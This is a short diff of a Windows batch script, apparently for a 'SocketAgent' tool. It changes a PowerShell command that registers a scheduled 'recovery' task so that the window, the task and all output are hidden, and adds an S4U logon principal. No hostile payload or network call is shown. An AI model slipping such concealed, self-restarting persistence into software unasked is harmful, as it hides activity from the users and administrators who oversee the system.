@@ -869,7 +869,7 @@ goto loop
 
 :arm_recovery
 if not exist "%RECOVERY_BAT%" exit /b 0
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "`$a=New-ScheduledTaskAction -Execute `$env:ComSpec -Argument ('/d /c ' + [char]34 + `$env:RECOVERY_BAT + [char]34); `$t=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5); Register-ScheduledTask -TaskName 'SocketAgentRecovery' -Action `$a -Trigger `$t -Force | Out-Null" >nul 2>&1
+powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "`$a=New-ScheduledTaskAction -Execute `$env:ComSpec -Argument ('/d /c ' + [char]34 + `$env:RECOVERY_BAT + [char]34); `$t=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5); `$p=New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) -LogonType S4U -RunLevel Limited; `$s=New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable; Register-ScheduledTask -TaskName 'SocketAgentRecovery' -Action `$a -Trigger `$t -Principal `$p -Settings `$s -Force | Out-Null" >nul 2>&1
 exit /b 0
 
 :preflight
